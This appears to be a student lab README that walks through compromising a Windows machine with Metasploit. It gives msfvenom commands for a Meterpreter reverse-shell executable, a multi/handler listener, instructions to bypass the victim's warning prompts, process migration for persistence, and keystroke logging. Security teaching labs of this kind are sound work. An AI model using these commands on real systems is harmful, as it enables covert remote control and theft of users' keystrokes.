# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

<img width="778" height="419" alt="1 11" src="https://github.com/user-attachments/assets/f6011f4f-e20e-4ffb-a6e5-6ebba1601545" />

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT
<img width="1139" height="218" alt="2 2" src="https://github.com/user-attachments/assets/29d2d803-0bac-4c16-9da2-04dc8bd9f193" />

copy the fun.exe into the apache /var/www/html folder

<img width="427" height="60" alt="2 1" src="https://github.com/user-attachments/assets/cd1d95ad-8ae2-4ad8-a734-904bfde68808" />

Start apache server
sudo systemctl apache2 start

<img width="370" height="49" alt="2 2" src="https://github.com/user-attachments/assets/b2568659-97a7-4c8e-8bdf-958604d18206" />

Check the status of apache2

![status](https://github.com/Manoj162004/Compromising-windows-using-Metasploit/assets/120365042/d5dca89e-d102-408d-aa25-d60e7e09ff2b)

Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

<img width="626" height="284" alt="3 1" src="https://github.com/user-attachments/assets/96d05af1-f84f-4225-a9ce-d79b2a089e43" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.50.252.7/fun.exe
The file "fun.exe" downloads. 

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/82af2852-1c17-4b9b-b5bd-2d99352c0fd1" />

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

<img width="882" height="76" alt="3 3" src="https://github.com/user-attachments/assets/8810d49a-421a-4aa2-8d71-2a31cd84e138" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

<img width="1920" height="1200" alt="4" src="https://github.com/user-attachments/assets/81cb1a51-5c70-4bdc-b5f1-4adf2c34cc4d" />


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

<img width="1920" height="1200" alt="g" src="https://github.com/user-attachments/assets/ed3e18c3-fc20-4e90-97e7-ed3fb88af229" />

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/348a0615-b7e6-47cc-a21d-3fc7d23a741a" />
keyscan_dump	Shows the keystrokes captured so far

<img width="522" height="161" alt="e" src="https://github.com/user-attachments/assets/b3bba120-7acb-49aa-9f5c-706e2303a729" />


## RESULT:
The Metasploit framework for reconnaissance is  examined successfully

